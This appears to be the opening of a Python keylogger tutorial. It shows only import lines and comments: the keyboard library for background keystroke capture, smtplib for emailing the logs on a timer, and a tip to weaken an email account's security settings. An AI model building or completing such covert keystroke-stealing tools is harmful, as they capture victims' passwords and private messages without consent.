"""
import the library that will listen for the keystrokes on the background... some of those libraries include pynput,pyxhook/pyhook,keyboard and others but for this code, i'll use the keyboard one. why? i just like it better than all the rest.
"""
import keyboard
#import the module that sends the email(if that is the method of collection you want) using the Simple Mail Transfer Protocol(SMTP)
import smtplib
#import timer so as to send the email after an interval of time
from threading import Timer
#import datetime, this comes in handy during creating a file to save the keystroke...in the naming of the file.
from datetime import datetime

#for an email report, you'll need to sent up you email account in a way that will accept access from less secure app since we'll be using the #smtplib to send the report


